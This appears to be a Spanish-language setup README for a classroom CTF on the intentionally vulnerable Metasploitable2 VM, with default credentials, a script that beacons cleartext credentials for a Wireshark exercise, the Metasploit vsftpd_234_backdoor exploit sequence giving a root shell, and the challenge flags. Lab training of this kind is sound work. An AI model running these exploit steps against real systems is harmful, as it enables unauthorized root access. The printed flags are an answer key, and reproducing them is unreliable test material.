# Laboratorio Metasploitable2 — Goldilocks CTF

Esta VM trae preconfigurados los retos **1 (Nmap)**, **4 (Wireshark)** y **10
(Metasploit)** del CTF, para que se resuelvan con herramientas y tráfico
reales contra ella (no simulados). Este documento es para quien importe la
`.ova` en su propio equipo (profesor/revisor).

> ⚠ Esta VM es intencionalmente vulnerable. Mantenla **siempre** en una red
> aislada (Host-Only / interna de VirtualBox), nunca con adaptador Bridged ni
> expuesta a internet.

---

## ⚡ Resumen rápido (en orden, obligatorio)

1. Importar el `.ova` (sección 1).
2. Antes de arrancar: **desmarcar "Habilitar EFI"** y poner el adaptador de
   red en **"Adaptador solo-anfitrión"**, misma red que su Kali.
3. Arrancar, login `msfadmin`/`msfadmin`, anotar su IP con `ifconfig`.
4. **Cambiar la IP del reto 4** al script (sección 4) — si se saltan este
   paso, el reto 4 no funciona.
5. Verificar los 3 retos (sección 5) y enviar las flags en la app Goldilocks
   (sección 6).

---

## 1. Importar la VM

1. VirtualBox → **Archivo → Importar servicio virtualizado...** → selecciona
   el `.ova`.
2. Al terminar, antes de arrancarla, revisa en **Configuración**:
   - **Sistema → Placa base**: la casilla **"Habilitar EFI"** debe estar
     **desmarcada** (esta imagen es BIOS clásica; con EFI no arranca).
   - **Red → Adaptador 1**: **"Adaptador solo-anfitrión"**, en la misma red
     Host-Only donde tengas tu Kali (crea una en
     `Archivo → Herramientas → Administrador de red` si no existe).

## 2. Credenciales
| Usuario | Contraseña |
|---|---|
| `msfadmin` | `msfadmin` |

## 3. Arranca y anota su IP
```bash
ifconfig
```
Busca la IP de `eth0` (rango `192.168.56.x` si usas la red Host-Only por
defecto). La necesitarás para el reto 1 y para la app Goldilocks.

## 4. Configura a dónde reporta el reto 4 (Wireshark) — IMPORTANTE

El reto 4 envía credenciales en texto claro cada 30s hacia una Kali
específica. **Esa IP está escrita directamente en el script** (es la Kali de
quien armó esta VM) — si no la cambias, el reto 4 **no les va a funcionar**,
va a seguir mandando los datos a una IP que no es la de ustedes.

Corran este único comando, reemplazando `<SU_IP_DE_KALI>` por la IP real de
su propia Kali en la red host-only (confírmenla con `ip a` en su Kali):

```bash
sudo sed -i 's/192.168.56.108/<SU_IP_DE_KALI>/' /usr/local/bin/goldilocks-cred-beacon.sh
sudo pkill -f goldilocks-cred-beacon.sh
sudo nohup /usr/local/bin/goldilocks-cred-beacon.sh >/dev/null 2>&1 &
```

Verifiquen que quedó bien:
```bash
cat /usr/local/bin/goldilocks-cred-beacon.sh
# debe mostrar su IP, no 192.168.56.108
ps aux | grep goldilocks-cred-beacon
# debe mostrar el proceso corriendo
```

Si por algún motivo los servicios no están corriendo en absoluto
(`ps aux | grep goldilocks` no muestra nada), reinícienlos con:
```bash
sudo pkill -f goldilocks-nmap-banner.sh 2>/dev/null
sudo pkill -f goldilocks-cred-beacon.sh 2>/dev/null
sudo nohup /usr/local/bin/goldilocks-nmap-banner.sh >/dev/null 2>&1 &
sudo nohup /usr/local/bin/goldilocks-cred-beacon.sh >/dev/null 2>&1 &
```
(el reto 1, el banner de Nmap, **no** necesita ningún ajuste — funciona igual
sin importar qué Kali lo escanee)

---

## 5. Verificar cada reto

### Reto 1 — Nmap
Desde Kali:
```bash
nmap -sV -p 1337 <IP_METASPLOITABLE2>
# o más simple:
nc <IP_METASPLOITABLE2> 1337
```
Debe mostrar: `PIEZA{osito_nmap_hosts_activos}`

### Reto 4 — Wireshark
1. En Kali, deja algo escuchando el check-in:
   ```bash
   while true; do nc -l -p 8080 -q 1 2>/dev/null; done
   ```
2. Captura con Wireshark la interfaz de la red host-only, filtro
   `http.authorization`, espera hasta 30s.
3. Follow → HTTP Stream, copia el valor de `Authorization: Basic ...` y
   decodifícalo:
   ```bash
   echo '<valor_base64>' | base64 -d
   ```
   Debe dar: `ricitos:PIEZA{ricitos_wireshark_credenciales}`

### Reto 10 — Metasploit
La flag ya está plantada en el sistema (se generó al resolver el reto por
primera vez). Para reverificarla en vivo con el exploit real:
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <IP_METASPLOITABLE2>
set LHOST <IP_DE_TU_KALI>
set AutoCheck false
run
```
> Este exploit es conocido por fallar el primer intento ("Unable to connect
> to backdoor... Cooldown?"). Si pasa, reinicia vsftpd en la VM
> (`sudo /etc/init.d/vsftpd restart` si existe, o simplemente reintenta
> `run` 2-3 veces) y vuelve a intentar.

Una vez dentro (`meterpreter > shell`):
```bash
whoami              # debe ser root
cat /home/msfadmin/mama_osa.flag
```
Debe mostrar: `PIEZA{mama_metasploit_exploit}`

---

## 6. Enviar las flags en la app Goldilocks CTF
Las 3 flags se registran en la app, no en esta VM. Entra a
`/challenges/nmap`, `/challenges/wireshark` y `/challenges/metasploit` y
pégalas en el formulario de cada reto.
